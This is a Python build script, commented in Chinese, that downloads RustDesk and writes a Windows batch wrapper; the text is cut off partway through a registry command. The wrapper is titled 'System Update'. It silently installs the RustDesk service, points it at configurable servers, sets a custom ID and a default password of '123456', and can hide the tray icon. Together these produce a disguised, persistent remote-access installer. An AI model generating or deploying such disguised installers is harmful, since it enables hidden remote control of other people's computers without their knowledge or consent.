import os
import sys
import zipfile
import shutil
import requests
import uuid
import json

# --- 配置部分 ---
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")

API_SERVER = os.getenv("API_SERVER", "")
ID_SERVER = os.getenv("ID_SERVER", "")
RELAY_SERVER = os.getenv("RELAY_SERVER", "")
KEY = os.getenv("KEY", "")
CUSTOM_ID = os.getenv("CUSTOM_ID", "").strip() 
PASSWORD = os.getenv("PASSWORD", "123456")
OS_TARGET = os.getenv("OS_TARGET", "windows")
HIDE_TRAY = os.getenv("HIDE_TRAY", "false")

def log(msg):
    print(f"🔨 {msg}")

def get_default_branch():
    """自动获取仓库的默认分支名称"""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            branch = r.json().get('default_branch', 'main')
            log(f"检测到仓库默认分支: {branch}")
            return branch
        else:
            return 'main'
    except Exception as e:
        return 'main'

def get_latest_rustdesk_version():
    """获取 RustDesk 最新版本号"""
    log("正在获取 RustDesk 最新版本...")
    url = "https://api.github.com/repos/rustdesk/rustdesk/releases/latest"
    try:
        headers = {'User-Agent': 'Python-RustDesk-Builder'}
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code != 200:
            return "1.2.3" 

        tag_name = r.json()['tag_name']
        if tag_name.startswith('v'):
            return tag_name[1:] 
        return tag_name
    except Exception as e:
        return "1.2.3"

def download_file(url, dest):
    log(f"正在下载: {url}")
    try:
        response = requests.get(url, stream=True, timeout=60)
        # 如果官方文件404，直接报错，别继续
        if response.status_code != 200:
             raise Exception(f"官方下载链接返回: {response.status_code}")
             
        with open(dest, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        log("下载完成")
    except Exception as e:
        raise Exception(f"下载文件失败: {e}")

def generate_windows_wrapper():
    cmd_set_id = ""
    if CUSTOM_ID:
        cmd_set_id = f"rustdesk.exe --id \"{CUSTOM_ID}\"\n"
    bat_content = f"""@echo off
title System Update
schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1
taskkill /F /IM rustdesk.exe >nul 2>&1
taskkill /F /IM rustdesk-service.exe >nul 2>&1
rustdesk.exe --install-service
rustdesk.exe --key "{KEY}"
rustdesk.exe --api-server "{API_SERVER}"
rustdesk.exe --id-server "{ID_SERVER}"
IF NOT "{RELAY_SERVER}"=="" (
    rustdesk.exe --relay-server "{RELAY_SERVER}"
)
{cmd_set_id}
rustdesk.exe --password "{PASSWORD}"
IF "{HIDE_TRAY}"=="true" (
    reg add "HKCU\\
